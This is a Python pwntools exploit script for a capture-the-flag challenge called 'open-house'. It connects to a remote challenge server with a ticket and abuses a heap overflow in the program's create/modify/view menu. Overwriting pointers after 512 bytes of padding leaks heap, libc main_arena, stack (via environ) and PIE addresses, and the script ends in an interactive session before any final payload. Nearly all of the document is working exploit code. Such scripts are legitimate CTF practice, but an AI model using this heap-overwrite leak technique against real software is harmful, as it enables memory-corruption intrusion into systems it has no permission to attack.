#!/usr/bin/env python3

from pwn import *

e = ELF('./open-house')
libc = ELF('./libc.so.6')

p = remote("open-house-6dvpeatmylgze.shellweplayaga.me",10001)
p.sendlineafter(b"please:",b"ticket{AssociationCondo7605n23:Mb-M8mUJrIDYLs_pZKal2mNbEXhp9JVlzPZ0NEppDcl4Hop9}")
#gdb.attach(p)


def c(data):
    p.sendlineafter(b"> ",b"c")
    p.sendlineafter(b"!\n",data)

def d(idx): # idx starts at 1 not 0
    p.sendlineafter(b"> ",b"d")
    p.sendlineafter(b"?\n",str(idx).encode())
    return p.recvline()

def m(idx,data):
    p.sendlineafter(b"> ",b"m")
    p.sendlineafter(b"?\n",str(idx).encode())
    p.sendlineafter(b"?\n",data)

def v(x=False, delim=b"AAAA"):
    p.sendlineafter(b"> ",b"v")
    if x:
        p.recvuntil(delim)
        return p.recvline()
    return p.recv()
c(b"A"*600)
c(b"A"*1)
heap = (u32(v(x=True, delim=b"A"*512).strip()[:4])-0x2860)

for i in range(1,9):
    d(i)
LIBC_PTR = heap + 0x1430

log.success(f"Leaked heap @ {hex(heap)}")

c("B"*8)
c("C"*8)
m(5,b"D"*512+p64(LIBC_PTR))
v(x=True,delim=b"D"*512)
main_arena = u32(p.recv(50)[7:11])-56
log.success(f"Leaked main_arena @ {hex(main_arena)}")

libc.address = main_arena - 0x22a7c0

c("E"*8)
c("F"*8)
log.info(hex(libc.sym.environ))
m(7,b"G"*512+p64(libc.address + 0x22AFE0))

v(x=True,delim=b"G"*512)
stack_leak = u32(p.recv(50)[7:11])
log.success(f"Leaked stack addr @ {hex(stack_leak)}")

offset = 0x6c

c("G"*8)
c("H"*8)
m(9,b"I"*512+p64(stack_leak + offset))


v(x=True,delim=b"I"*512)
PIE_leak = u32(p.recv(50)[7:11])
log.success(f"Leaked stack addr @ {hex(PIE_leak)}")


pie_addr = stack_leak - 0x160


p.interactive()
